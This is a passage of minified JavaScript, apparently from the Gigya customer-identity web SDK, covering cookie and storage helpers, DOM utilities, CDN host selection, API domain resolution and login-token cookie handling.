          void 0 === t && (t = o.localInfo.pageDomain), this._removeFromBaseDomains(e, t), this.set(e, "", -1, "", !1), this.set(e, "", -1, "", !0);
        }, e.prototype.getInfiniteExpirationTimeInSeconds = function () {
          return 31536e3;
        }, e.prototype.canSaveCookie = function (t) {
          void 0 === t && (t = null);
          try {
            return this.set(e.testCookieName, "true", 1, t, null);
          } catch (e) {
            return !1;
          }
        }, e.prototype.getDefaultDomain = function (e, t) {
          return void 0 === e && (e = o.localInfo.pageDomain), void 0 === t && (t = o.localInfo.baseDomain || ""), t.length > 0 && e.length >= t.length && e.lastIndexOf(t) === e.length - t.length ? t : e;
        }, e.prototype._getExpirationInMs = function (e) {
          return null == e || "" === e || isNaN(e) ? 1e3 * this.getInfiniteExpirationTimeInSeconds() : 0 == e ? null : 1e3 * e;
        }, e.prototype._setCookieInternal = function (t, n, i, r, a, s) {
          var c;
          void 0 === s && (s = e._getSameSiteMode());
          var u = 0 === (null !== (c = null === o.localInfo || void 0 === o.localInfo ? void 0 : o.localInfo.protocol) && void 0 !== c ? c : document.location.protocol).indexOf("https");
          return this._cookieStore.setCookie(t, n, {
            path: i,
            expires: r,
            domain: a,
            sameSite: s,
            secure: u
          }), !!this.get(t) || !!s && ("None" !== s && this._fallbackToSameSiteNone(t, n, i, r, a, u), this.get(t) ? (this._reportFallback("Setting SameSite=None", {
            name: t,
            value: n,
            sameSiteMode: s
          }), !0) : (this._cookieStore.setCookie(t, n, {
            path: i,
            expires: r,
            domain: a,
            secure: u
          }), !!this.get(t) && (this._reportFallback("Cookie established only without sameSite mode", {
            name: t,
            value: n,
            sameSiteMode: s
          }), !0)));
        }, e.prototype._removeFromBaseDomains = function (e, t) {
          for (var n = t.split("."), i = 0; i < n.length - 1; i++) {
            var o = n.slice(i).join(".");
            this.set(e, "", -1, o, !1), this.set(e, "", -1, o, !0);
          }
        }, e._getSameSiteMode = function () {
          if (!e._disallowSameSiteMode()) return "None";
        }, e._disallowSameSiteMode = function () {
          var e,
            t,
            n = null !== (e = null === o.localInfo || void 0 === o.localInfo ? void 0 : o.localInfo.protocol) && void 0 !== e ? e : document.location.protocol,
            i = null !== (t = null === o.localInfo || void 0 === o.localInfo ? void 0 : o.localInfo.userAgent) && void 0 !== t ? t : navigator.userAgent.toLowerCase();
          return !(0 === n.indexOf("https")) || !i || i.indexOf("CPU iPhone OS 12") > -1 || i.indexOf("iPad; CPU OS 12") > -1 || i.indexOf("Macintosh; Intel Mac OS X 10_14") > -1 && i.indexOf("Version/") > -1 && i.indexOf("Safari") > -1 || i.indexOf("Chrome/5") > -1 && i.indexOf("Chrome/6") > -1;
        }, e.prototype._fallbackToSameSiteNone = function (e, t, n, i, o, r) {
          this._cookieStore.setCookie(e, t, {
            path: n,
            expires: i,
            domain: o,
            sameSite: "None",
            secure: r
          });
        }, e.prototype._reportFallback = function (e, t) {
          window.gigya.logger.report("Cookie Policy Fallback: " + e, i.__assign(i.__assign({}, t), {
            isIframe: this._isIFrame()
          }), !1);
        }, e.prototype._isIFrame = function () {
          var e;
          try {
            return (null === window || void 0 === window ? void 0 : window.location) !== (null === (e = null === window || void 0 === window ? void 0 : window.parent) || void 0 === e ? void 0 : e.location);
          } catch (e) {
            return !0;
          }
        }, e.testCookieName = "gig3pctest", e;
      }();
    t.CookieUtils = a, t.default = new a();
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(3),
      o = n(39),
      r = n(9);
    t._popupContainers = [], t._pseudoContainers = [];
    var a = 999999999,
      s = null;
    function c() {
      return ++a;
    }
    function u(e, t, n) {
      e && n && (e.addEventListener ? e.addEventListener(t, n, !0) : e.attachEvent("on" + t, n));
    }
    function l(e, t, n) {
      e && n && (e.removeEventListener ? e.removeEventListener(t, n, !0) : e.detachEvent("on" + t, n));
    }
    function d() {
      s && (l(window, "hashchange", s), s = null, window.location.hash = window.location.hash.replace("|gigyaMobileDialog", ""));
    }
    function g(e, t) {
      void 0 === t && (t = window.document), t.body && t.body.appendChild(e);
    }
    function f(e) {
      var t = [];
      return "string" == typeof e.className && (t = e.className.split(" ")), t;
    }
    function p(e, t) {
      if (!e) return !1;
      if (!t) return !0;
      if (!e.className) return !1;
      for (var n = !1, i = f(e), o = 0; o < i.length; o++) if (i[o] === t) {
        n = !0;
        break;
      }
      return n;
    }
    t.getNextZIndex = c, t.getGigyaScriptElement = function (e) {
      for (var t, n = document.getElementsByTagName("script"), i = /\/\/cdn(s)?\.(ru1\.)?gigya.com/, o = n.length - 1; o >= 0; o--) {
        var r = n[o],
          a = r.src.toLowerCase();
        if ("" !== a) if (i.test(a) || a.indexOf("?apikey=") > -1) if (0 === e.length || e.some(function (e) {
          return a.indexOf(e) > -1;
        })) {
          t = r;
          break;
        }
      }
      return t;
    }, t.dispatch = function (e, t) {
      var n;
      try {
        n = new Event(t);
      } catch (e) {
        (n = document.createEvent("CustomEvent")).initCustomEvent(t, !0, !0, {});
      }
      e.dispatchEvent(n);
    }, t.addButtonSubmitListener = function (e, t, n, i) {
      void 0 === n && (n = "click"), e && (e.setAttribute("role", "button"), "-1" != e.getAttribute("tabindex") && e.setAttribute("tabindex", "0"), u(e, n, function (e) {
        return t(e);
      }), u(e, "keydown", function (e) {
        13 == (e.which || e.keyCode) && (e.preventDefault(), t(e));
      }));
    }, t.addEventListener = u, t.addActivationHandler = function (e, t) {
      e && t && (this.addEventListener(e, "keydown", function (e) {
        "Space" !== e.code && "Enter" !== e.code || t();
      }), this.addEventListener(e, "click", t));
    }, t.removeEventListener = l, t.disableDefaultEventHandling = function (e) {
      e.preventDefault ? e.preventDefault() : window.event && (window.event.returnValue = !1);
    }, t.addDialogBackListener = function (e) {
      d(), s = function (t) {
        t && t.newURL && -1 == t.newURL.indexOf("|gigyaMobileDialog") && (e(t), d());
      }, window.setTimeout(function () {
        -1 == window.location.hash.indexOf("|gigyaMobileDialog") && (window.location.hash = window.location.hash + "|gigyaMobileDialog"), u(window, "hashchange", s);
      }, 50);
    }, t._removeDialogBackListener = d, t.prependToBody = function (e, t) {
      void 0 === t && (t = window.document), t.body && (t.body.insertBefore && t.body.firstChild ? t.body.insertBefore(e, t.body.firstChild) : t.body.appendChild(e));
    }, t.appendToBody = g, t.removeElement = function (e) {
      e && e.parentElement && e.parentElement.removeChild(e);
    }, t.isChildOf = function (e, t) {
      for (var n = e.parentNode; n;) {
        if (t == n) return !0;
        n = n.parentNode;
      }
      return !1;
    }, t.isVisible = function (e) {
      for (; e;) {
        var t = getComputedStyle(e);
        if ("none" === t.display || "hidden" === t.visibility) return !1;
        e = e.parentElement;
      }
      return !0;
    }, t.getCenteredDivID = function (e) {
      return "gig_" + i.localInfo.initTime.getTime().toString() + "_" + e;
    }, t.createElementWithAttributes = function (e, t) {
      var n = document.createElement(e);
      if (t) for (var i in t) n[i] = t[i];
      return n;
    }, t.createTopLevelDiv = function (e) {
      var t = document.createElement("div");
      return null != t.style.zIndex && (t.style.zIndex = "" + c()), t.innerHTML = "", e && (t.id = e), document.body && (document.body.insertBefore && document.body.firstChild ? document.body.insertBefore(t, document.body.firstChild) : document.body.appendChild && document.body.appendChild(t)), t;
    }, t.hideByID = function (e) {
      var t = document.getElementById(e);
      t && (t.style.display = "none");
    }, t.showByID = function (e) {
      var t = document.getElementById(e);
      t && (t.style.display = i.localInfo.isIE6 ? "TD" == t.tagName ? "table-cell" : "TR" == t.tagName || "TABLE" == t.tagName ? "" : "block" : "");
    }, t.clearByID = function (e) {
      try {
        var t = document.getElementById(e);
        null != t && (t.innerHTML = "");
      } catch (e) {}
    }, t.getHTMLSize = function (e, t) {
      var n = document.createElement("div");
      n.style.position = "absolute", n.style.left = "-1000px", n.innerHTML = e, t.appendChild(n);
      var i = n.offsetWidth,
        o = n.offsetHeight;
      return n.parentNode.removeChild(n), {
        w: i,
        h: o
      };
    }, t.getElementsByClass = function (e, t, n) {
      if (!e) return [];
      var i = [];
      n && p(e, t) && i.push(e);
      for (var o = e.getElementsByTagName("*"), r = 0; r < o.length; r++) p(o[r], t) && i.push(o[r]);
      return i || [];
    }, t.getElementsByAttribute = function (e, t, n, i) {
      for (var o = [], r = e.getElementsByTagName(t), a = 0; a < r.length; a++) r[a].getAttribute(n) == i && o.push(r[a]);
      return o;
    }, t.getElementPosition = function (e) {
      if (!e) return {
        left: 0,
        top: 0,
        bottom: 0,
        right: 0
      };
      var t = e.getBoundingClientRect(),
        n = o.getScroll(),
        i = t.left + n.left,
        r = t.top + n.top;
      return {
        left: i,
        top: r,
        right: i + t.width,
        bottom: r + t.height
      };
    }, t.addClassToElement = function (e, t) {
      if (e) {
        var n = e.className ? f(e) : [],
          i = n.length,
          o = t.split(" ");
        for (var r in o) {
          var a = !1;
          if (!o[r]) break;
          for (var s in n) if (n[s] === o[r]) {
            a = !0;
            break;
          }
          a || n.push(o[r]);
        }
        n.length !== i && (e.className = n.join(" "));
      }
    }, t.removeClassFromElement = function (e, t, n) {
      if (void 0 === n && (n = !1), e) {
        for (var i = f(e), o = i.length - 1; o >= 0; o--) (i[o] === t || n && -1 !== i[o].indexOf(t)) && i.splice(o, 1);
        e.className = i.join(" ");
      }
    }, t.getClassNames = f, t.isElementClass = p, t.cancelEvent = function (e) {
      e && ("cancelable" in e ? e.preventDefault() : e.returnValue = !1);
    }, t.createElement = function (e, t) {
      var n = document.createElement("div");
      return t = t || "", n.innerHTML = "<" + e + ' name="' + t + '" id="' + t + '"></' + e + ">", n.firstChild;
    }, t.setSize = function (e, t, n, i) {
      if (null != e && null != e.style) {
        if (t) {
          var r = (t = "" + t).indexOf("%") > 0;
          if (!isNaN(t) || r) {
            var a = "" + (r ? t : t + "px");
            e.style.width != a && (e.style.width = a);
          }
        }
        if (n) {
          var s = (n = "" + n).indexOf("%") > 0;
          if (!isNaN(t) || s) {
            var u = "" + (s ? n : n + "px");
            e.style.height !== u && (e.style.height = u);
          }
        }
        if (i && t && n) {
          (null == e.style.zIndex || i) && (e.style.zIndex = "" + c());
          var l = o.getInnerSize(),
            d = o.getScroll(),
            g = d.top,
            f = d.left;
          e.style.top = Math.max(0, g + Math.floor((l.h - n) / 2)) + "px", e.style.left = Math.max(0, f + Math.floor((l.w - t) / 2)) + "px", e.style.visibility = "";
        }
      }
    }, t.createHiddenIframe = function (e) {
      var t = document.createElement("iframe");
      return t.src = e, t.style.width = "30px", t.style.height = "10px", t.style.position = "absolute", t.style.top = "-1000px", t.style.left = "-1000px", document.body ? g(t) : r.invokeOnPageLoad(function () {
        g(t);
      }), t;
    }, t.attributeEncode = function (e) {
      return e.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\"/g, "&quot;").replace(/\'/g, "&#39;");
    }, t.manipulateAttributes = function (e, t, n, i) {
      void 0 === i && (i = function () {
        return !0;
      }), e.forEach(function (e) {
        e.attributes && Array.prototype.slice.call(e.attributes).forEach(function (e) {
          i(e) && (e.value = e.value.replace(t, n));
        });
      });
    }, t.textNodesUnder = function (e) {
      for (var t, n = [], i = document.createTreeWalker(e, NodeFilter.SHOW_TEXT, null, !1); t = i.nextNode();) n.push(t);
      return n;
    }, t.isHTMLBooleanAttribute = function (e) {
      return ["autocomplete", "autofocus", "checked", "disabled", "hidden", "readonly", "required", "selected"].indexOf(e) > -1;
    }, t.isBelongToGigyaFieldset = function e(t) {
      return !(!t || t instanceof HTMLFormElement) && (!!p(t.parentElement, "gigya-fieldset") || e(t.parentElement));
    }, t.getClosestElement = function (e, t, n) {
      for (void 0 === n && (n = document), Element.prototype.matches || (Element.prototype.matches = Element.prototype.msMatchesSelector || Element.prototype.webkitMatchesSelector); e && e !== n; e = e.parentNode) if (null == e ? void 0 : e.matches(t)) return e;
      return null;
    }, t.createElementFromTemplate = function (e) {
      var t;
      void 0 === e && (e = "");
      var n = document.createElement("div");
      return n.innerHTML = null == e ? void 0 : e.trim(), null !== (t = n.firstChild) && void 0 !== t ? t : n;
    }, t.isParentHasClass = function e(t, n) {
      var i;
      return !!(null === (i = null == t ? void 0 : t.classList) || void 0 === i ? void 0 : i.contains(n)) || !!(null == t ? void 0 : t.parentElement) && e(null == t ? void 0 : t.parentElement, n);
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(5),
      r = n(3),
      a = n(12),
      s = function () {
        function e() {}
        return e.getName = function () {
          return "AbstractAdapter";
        }, e.prototype.setObject = function (e, t) {
          this.setItem(e, o.serialize(t));
        }, e.prototype.getObject = function (e, t) {
          return o.deserialize(this.getItem(e), t);
        }, e.prototype.isPersistent = function () {
          return !0;
        }, e;
      }();
    t.AbstractLocalStorageAdapter = s;
    var c = function (e) {
      function t() {
        var t = e.call(this) || this;
        return t.isLoaded = !1, t;
      }
      return i.__extends(t, e), t.prototype.isReady = function () {
        return this.isLoaded;
      }, t.prototype.waitForService = function (e) {
        var t = this;
        this.isReady() ? e() : setTimeout(function () {
          return t.waitForService(e);
        }, 50);
      }, t;
    }(s);
    t.AbstractAsyncLocalStorageAdapter = c;
    var u = function (e) {
        function t() {
          return null !== e && e.apply(this, arguments) || this;
        }
        return i.__extends(t, e), t.prototype.getItem = function (e) {
          return this.storage[e];
        }, t.prototype.setItem = function (e, t, n) {
          try {
            this.storage[e] = t;
          } catch (e) {}
        }, t.prototype.removeItem = function (e) {
          this.storage.removeItem(e);
        }, t;
      }(s),
      l = function (e) {
        function t() {
          var t = e.call(this) || this;
          return t.storage = window.localStorage, t;
        }
        return i.__extends(t, e), t.getName = function () {
          return "LocalStorageAdapter";
        }, t.isAvailable = function () {
          return r.localInfo.supportsLocalStorage;
        }, t;
      }(u),
      d = function (e) {
        function t() {
          var t = e.call(this) || this;
          return t.storage = window.sessionStorage, t;
        }
        return i.__extends(t, e), t.getName = function () {
          return "SessionStorageAdapter";
        }, t.isAvailable = function () {
          return r.localInfo.supportsSessionStorage;
        }, t;
      }(u),
      g = function (e) {
        function t() {
          return null !== e && e.apply(this, arguments) || this;
        }
        return i.__extends(t, e), t.isAvailable = function () {
          return r.localInfo.isFF && window.globalStorage;
        }, t.getName = function () {
          return "FirefoxStorageAdapter";
        }, t.prototype.getItem = function (e) {
          return window.globalStorage[location.hostname][e];
        }, t.prototype.setItem = function (e, t, n) {
          try {
            window.globalStorage[location.hostname][e] = t;
          } catch (e) {}
        }, t.prototype.removeItem = function (e) {
          delete window.globalStorage[location.hostname][e];
        }, t;
      }(s),
      f = function (e) {
        function t() {
          return null !== e && e.apply(this, arguments) || this;
        }
        return i.__extends(t, e), t.isAvailable = function () {
          return a.default.canSaveCookie();
        }, t.getName = function () {
          return "CookieStorageAdapter";
        }, t.prototype.getItem = function (e) {
          return a.default.get(e);
        }, t.prototype.setItem = function (e, t, n, i, o) {
          void 0 === o && (o = {}), a.default.set(e, t, n, i, o.dontUseRootPath, o.sameSite);
        }, t.prototype.removeItem = function (e) {
          a.default.remove(e);
        }, t;
      }(s);
    t.CookieStorageAdapter = f;
    var p = function (e) {
      function t() {
        var t = e.call(this) || this;
        return t.memory = {}, t;
      }
      return i.__extends(t, e), t.isAvailable = function () {
        return !0;
      }, t.getName = function () {
        return "MemoryStorageAdapter";
      }, t.prototype.getItem = function (e) {
        return this.memory[e];
      }, t.prototype.setItem = function (e, t, n) {
        this.memory[e] = t;
      }, t.prototype.removeItem = function (e) {
        delete this.memory[e];
      }, t.prototype.isPersistent = function () {
        return !1;
      }, t;
    }(s);
    function h(e) {
      var n = e.getName() || e.name;
      return t.instances[n] || (t.instances[n] = new e()), t.instances[n];
    }
    function v(e) {
      for (var n, i = 0, o = t.adapters; i < o.length; i++) {
        var r = o[i];
        if (r.isAvailable()) {
          if (r.prototype instanceof c && !e) continue;
          n = h(r);
          break;
        }
      }
      return n || (n = h(p)), e && (n instanceof c ? n.waitForService(function () {
        e(n);
      }) : e(n)), n;
    }
    t.MemoryStorageAdapter = p, t.adapters = [l, d, g, f, p], t.instances = {}, t.initializeAdapter = h, t.waitForService = v;
    var y = v();
    t.getItem = function (e) {
      return y.getItem(e);
    }, t.setItem = function (e, t, n) {
      return y.setItem(e, t, n);
    }, t.removeItem = function (e) {
      return y.removeItem(e);
    }, t.setObject = function (e, t) {
      return y.setObject(e, t);
    }, t.getObject = function (e, t) {
      return y.getObject(e, t);
    };
  },, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(10),
      o = n(5),
      r = n(2);
    function a(e) {
      var t = unescape(e),
        n = i.URLDecode(e);
      return 0 !== t.localeCompare(n) && window.gigya.logger.report("urlDecoder and unescaped have different values", {
        unescapedResult: t,
        urlDecodeResult: n
      }), n;
    }
    t.serialize = function (e, t) {
      var n = [];
      for (var r in t || (t = "&"), e) switch (typeof e[r]) {
        case "function":
          break;
        case "object":
          null != e[r] && n.push(r + "=" + i.URLEncode(o.serialize(e[r])));
          break;
        case "undefined":
          break;
        default:
          n.push(r + "=" + i.URLEncode(e[r]));
      }
      return n.join(t);
    }, t.deserialize = function (e, t, n, o) {
      var s = {};
      if (!e) return s;
      t || (t = "&");
      for (var c = e.split(t), u = 0; u < c.length; u++) {
        var l = c[u],
          d = l.indexOf("=");
        if (-1 === d) {
          s[g = n ? l.toLowerCase() : l] = "1";
        } else {
          var g = l.substr(0, d);
          n && (g = g.toLowerCase());
          var f = l.substr(d + 1).replace(/\+/g, " ");
          try {
            s[g] = o ? r.FlagService.useDecodeURIComponent ? a(f) : unescape(f) : i.URLDecode(f);
          } catch (e) {
            s[g] = r.FlagService.useDecodeURIComponent ? i.URLDecode(f) : unescape(f);
          }
        }
      }
      return s;
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = {};
    function i(e) {
      if (!n[e]) return !1;
      for (var t in n[e].ids) return !0;
      return !1;
    }
    function o(e, t, i) {
      n[e] || (n[e] = {
        q: [],
        ids: {}
      }), n[e].q.push({
        func: t,
        args: i
      });
    }
    t._servicesStatus = function () {
      var e = {};
      for (var t in n) {
        var o = i(t);
        e[t] = o ? {
          active: !0,
          waitingFor: n[t].ids,
          queuedCount: n[t].q.length
        } : {
          active: !1
        };
      }
      return e;
    }, t.isActive = i, t.release = function (e, t) {
      if (window.gigya.logger.debug("releasing " + t + " queue by " + e), n[t] && (delete n[t].ids[e], !i(t))) {
        var o = n[t].q;
        for (n[t].q = []; o.length > 0;) {
          var r = o.splice(0, 1)[0];
          try {
            r.func.apply(this, r.args);
          } catch (n) {
            "object" == typeof console && console.log && console.log("Gigya: Exception while invoking queued method (" + t + ": " + e + ")");
          }
          if (i(t)) {
            n[t].q = o;
            break;
          }
        }
      }
    }, t.hold = function (e, t) {
      window.gigya.logger.debug("locking queue " + t + " by " + e), n[t] || (n[t] = {
        q: [],
        ids: {}
      }), n[t].ids[e] = !0;
    }, t.waitFor = o, t.queueForExecution = function (e, t, n) {
      n = n || [], i(e) ? o(e, t, n) : t.apply(this, n);
    };
  }, function (e, t) {
    function n(e, t) {
      for (var n = 0; n < e.length; ++n) t(e[n], n, e);
    }
    function i(e, t) {
      for (var n = 0; n < e.length; ++n) if (t(e[n], n, e)) return !0;
      return !1;
    }
    function o(e, t) {
      var n = -1;
      return i(e, function (e, i, o) {
        return !!t(e, i, o) && (n = i, !0);
      }), n;
    }
    function r(e, t) {
      return void 0 === e && (e = []), (null == e ? void 0 : e.indexOf(t)) >= 0;
    }
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.indexOf = function (e, t) {
      for (var n = 0; n < e.length; n++) if (e[n] == t) return n;
      return -1;
    }, t.clone = function (e) {
      for (var t = [], n = 0; n < e.length; n++) t[n] = e[n];
      return t;
    }, t.removeByValue = function (e, t) {
      if (e) for (var n = e.length - 1; n >= 0; n--) e[n] == t && e.splice(n, 1);
    }, t.removeByProperty = function (e, t, n) {
      if (e) for (var i = e.length - 1; i >= 0; i--) e[i][t] == n && e.splice(i, 1);
    }, t.getArrayFromString = function (e, t, n) {
      return e && "string" == typeof e ? (n && (e = e.toLowerCase()), (e = e.replace(/[ ]/g, "").replace(/,,/g, ",")) ? e.split(t) : []) : [];
    }, t.intersect = function (e) {
      for (var t = [], n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
      if (null == e) return [];
      for (var i = [], o = arguments.length, r = 0, a = e.length; r < a; r++) {
        var s = e[r];
        if (-1 == this.indexOf(i, s)) {
          for (var c = 1; c < o; c++) {
            var u = arguments[c];
            if (null == u || -1 == this.indexOf(u, s)) break;
          }
          c === o && i.push(s);
        }
      }
      return i;
    }, t.lastIndexOf = function (e, t, n) {
      void 0 === n && (n = 0);
      for (var i = e.length; --i >= n;) if (e[i] === t) return i;
      return -1;
    }, t.forEach = n, t.forEachProp = function (e, t) {
      for (var n in e) e.hasOwnProperty(n) && t(e[n], n, e);
    }, t.some = i, t.every = function (e, t) {
      for (var n = 0; n < e.length; ++n) if (!t(e[n], n, e)) return !1;
      return !0;
    }, t.everyProp = function (e, t) {
      for (var n in e) if (e.hasOwnProperty(n) && !t(e[n], n, e)) return !1;
      return !0;
    }, t.map = function (e, t) {
      var i = new Array();
      return n(e, function (e, n, o) {
        return i.push(t(e, n, o));
      }), i;
    }, t.firstIndex = o, t.first = function (e, t) {
      return e[o(e, t)];
    }, t.getAllEnumValues = function (e) {
      var t = [];
      for (var n in e) "number" == typeof e[n] && t.push(e[n]);
      return t;
    }, t.getUniqueValues = function (e) {
      for (var t = 0; t < e.length; ++t) for (var n = t + 1; n < e.length; n++) e[t] === e[n] && e.splice(n, 1);
      return e;
    }, t.includes = r, t.containsOnly = function (e, t) {
      return !(!e || !t) && e.length === t.length && (0 === e.length && 0 === t.length || !e.some(function (e) {
        return !r(t, e);
      }));
    };
  }, function (e, t) {
    function n(e) {
      return e.replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1");
    }
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.trim = function (e) {
      return e.replace(/^\s*(\S*(.*\S)?)\s*$/, "$1");
    }, t.format = function (e) {
      for (var t = [], n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
      for (var i = 0; i < arguments.length - 1; i++) null != arguments[i + 1] && (e = e.split("{" + i + "}").join(arguments[i + 1]));
      return e;
    }, t.capitalize = function (e) {
      return e.substring(0, 1).toUpperCase() + e.substring(1);
    }, t.endsWith = function (e, t) {
      return -1 !== e.indexOf(t, e.length - t.length);
    }, t.escapeRegExp = n, t.replaceAll = function (e, t, i) {
      return t ? e.replace(new RegExp(n(t), "g"), i) : e;
    }, t.mergeCommaSeparatedValues = function (e, t) {
      void 0 === e && (e = ""), void 0 === t && (t = "");
      var n = e.concat(",", t).split(",");
      return window.gigya.utils.array.getUniqueValues(n).filter(function (e) {
        return e;
      }).join(",");
    };
  },, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = 0;
    function i(e) {
      var i,
        o,
        r,
        a,
        s = null !== (o = null === (i = window.gigya.thisScript) || void 0 === i ? void 0 : i.baseDomain) && void 0 !== o ? o : "",
        c = null !== (a = null === (r = window.gigya.thisScript) || void 0 === r ? void 0 : r.protocol) && void 0 !== a ? a : "https";
      if (!s || /cdns?\.gigya\.com$/.test(s)) {
        var u = t.CDN_HOSTS[c];
        u.length <= n && (n = 0), s = u[n++];
      }
      return e && 0 !== e.indexOf("/") && (e = "/" + e), c + "://" + s + (e || "");
    }
    t.CDN_HOSTS = {
      http: ["cdn.gigya.com", "cdn1.gigya.com", "cdn2.gigya.com", "cdn3.gigya.com"],
      https: ["cdns.gigya.com", "cdns1.gigya.com", "cdns2.gigya.com", "cdns3.gigya.com"]
    }, t.getCdnResource = i, t.getImgCdnResource = function () {
      return i("/gs/i/");
    };
  }, function (e, t, n) {
    var i, o;
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var r,
      a = n(6),
      s = n(19),
      c = n(3),
      u = n(2),
      l = n(12);
    (null === (o = null === (i = window.gigya.partnerSettings) || void 0 === i ? void 0 : i.baseDomains) || void 0 === o ? void 0 : o.length) ? r = window.gigya.partnerSettings.baseDomains : (window.self === window.top && window.gigya.logger.warn("gigya: missing base domains for site"), r = [document.location.hostname]), c.localInfo.baseDomain = f(r);
    var d = ["socialize", "accounts", "fidm", "gm", "comments", "gcs", "ids", "ds", "gscounters", "reports"];
    function g(e, t, n) {
      void 0 === t && (t = window.gigya.dataCenter), void 0 === n && (n = window.gigya.defaultApiDomain), "sapcdm.cn" === n && "cn1" !== t && (n = "cn1." + n);
      var i = t + "." + n;
      return e ? e + "." + i : i;
    }
    function f(e, t, n) {
      if (void 0 === e && (e = window.gigya.partnerSettings.baseDomains), void 0 === t && (t = location.hostname), void 0 === n && (n = ["gigya.com", "cn1.sapcdm.cn", "localhost", window.gigya.defaultApiDomain]), !t) return "";
      "string" == typeof e && (e = e.split(","));
      var i = a.Uri.parse(t);
      n && (e = e.concat(n));
      for (var o = 0, r = e; o < r.length; o++) {
        var c = r[o],
          u = s.replaceAll(c, "*", ""),
          l = a.Uri.parse(u);
        if (l && i.isIn(l)) return window.gigya._ || (window.gigya._ = {}), window.gigya._.isTrustedDomain = !0, l.isForSubDomains() ? i.domain : l.domain;
      }
      return i.domain;
    }
    function p(e, t, n, i) {
      var o;
      void 0 === e && (e = window.gigya.partnerSettings && window.gigya.partnerSettings.customAPIDomainPrefix), void 0 === t && (t = c.localInfo.baseDomain), void 0 === n && (n = window.gigya.dataCenter), void 0 === i && (i = window.gigya.defaultApiDomain);
      var r = h();
      return r || (t.endsWith((null === (o = window.gigya._.config) || void 0 === o ? void 0 : o.hostedPagesDomain) || "my.gigya-ext.com") ? t : e && t && t !== i ? e + "." + t : g(void 0, n, i));
    }
    function h() {
      return l.default.get("pages_apiDomain_" + window.gigya.apiKey);
    }
    t.apiDomainFactory = function (e, t) {
      void 0 === e && (e = p()), void 0 === t && (t = window.gigya.defaultApiDomain);
      var n = a.Uri.parse(e).isIn(a.Uri.parse(t));
      return function (t) {
        if (t && n) {
          var i = t.split(".")[0];
          return "sdk" === i || "oauth" === i ? i = "accounts" : -1 == d.indexOf(i) && (window.gigya.logger.error("trying to send request to an invalid domain"), i = d[0]), i + "." + e;
        }
        return e;
      };
    }, t.getGigyaDomain = g, t.getBaseDomain = f, t.resolveApiDomain = p, t.getStorageDomain = function () {
      var e,
        t,
        n,
        i = h();
      if (i) return i;
      if (null === (t = null === (e = window.gigya.thisScript) || void 0 === e ? void 0 : e.globalConf) || void 0 === t ? void 0 : t.storageDomainOverride) return window.gigya.thisScript.globalConf.storageDomainOverride;
      if ((null === (n = window.gigya.thisScript) || void 0 === n ? void 0 : n.baseDomain) && u.FlagService.useGigyaJsBaseDomain) return window.gigya.thisScript.baseDomain;
      var o = window.gigya.defaultApiDomain;
      return window.gigya.utils.stringUtils.endsWith(o, "sapcdm.cn") && "cn1" !== window.gigya.dataCenter && (o = "cn1.sapcdm.cn"), ("global" !== window.gigya.dataCenter ? "cdns." + window.gigya.dataCenter : "cdns") + "." + o;
    };
  }, function (e, t) {
    var n;
    n = function () {
      return this;
    }();
    try {
      n = n || new Function("return this")();
    } catch (e) {
      "object" == typeof window && (n = window);
    }
    e.exports = n;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i,
      o = n(0),
      r = n(31),
      a = n(42),
      s = n(2),
      c = null,
      u = {};
    function l(e) {
      return void 0 === e && (e = window.gigya.thisScript.APIKey), window.gigya.utils.cookie.get(d(e));
    }
    function d(e) {
      return "gltexp_" + e;
    }
    function g(e) {
      return void 0 === e && (e = window.gigya.thisScript.APIKey), e ? "glt_" + e : "_gig_lt";
    }
    function f(e) {
      void 0 === e && (e = window.gigya.thisScript.APIKey);
      var t = window.gigya.utils.cookie.get(g(e));
      return t ? t.split("|")[0] : null;
    }
    function p(e, t, n, o) {
      window.gigya.utils.localStorage.removeItem("gigyaSettings"), window.gigya.logger.info("setting a new login token"), e || (e = window.gigya.thisScript.APIKey), e ? (s.FlagService.setCookieSameSiteLaxSession ? window.gigya.utils.cookie.set("glt_" + e, t, n, null, null, "Lax") : window.gigya.utils.cookie.set("glt_" + e, t, n), window.gigya.utils.cookie.remove("gac_" + e)) : s.FlagService.setCookieSameSiteLaxSession ? window.gigya.utils.cookie.set("_gig_lt", t, n, null, null, "Lax") : window.gigya.utils.cookie.set("_gig_lt", t, n), i = o;
    }
    function h() {
      return window.gigya.thisScript.APIKey && window.gigya.utils.cookie.get("gac_" + window.gigya.thisScript.APIKey);
    }
    function v(e, t, n) {
      if (void 0 === n && (n = h()), window.gigya.thisScript.APIKey) {
        if (n && !e.neverTryGAC) {
          if ('"' === n.charAt(0) && '"' === n.charAt(n.length - 1) && (n = n.substring(1, n.length - 1)), u[n]) return void t();
          u[n] = !0, window.gigya.socialize.updateRefUID(), window.gigya.socialize.notifyLogin({
            ignoreApiQueue: !0,
            neverTryGAC: !0,
            authCode: n,
            APIKey: window.gigya.thisScript.APIKey,
            client_id: window.gigya.thisScript.APIKey
          }, {
            callback: function () {
              window.gigya.utils.cookie.remove("gac_" + window.gigya.thisScript.APIKey), t(), window.gigya.socialize.refreshUI({
                neverTryGAC: !0
              });
            }
          });
        } else t();
      } else t();
    }
    function y(e) {
      return void 0 === e && (e = {}), o.__awaiter(this, void 0, void 0, function () {
        var t = this;
        return o.__generator(this, function (n) {
          return [2, new gigya.Promise(function (n) {
            window.gigya.utils.queue.hold("verifyLogin", "API"), window.gigya.accounts.verifyLogin({
              ignoreApiQueue: !0,
              suppressLoginEvent: !0,
              include: window.gigya.utils.stringUtils.mergeCommaSeparatedValues("profile,data", window.gigya.thisScript.globalConf.include),
              extraProfileFields: "samlData",
              callback: function (i) {
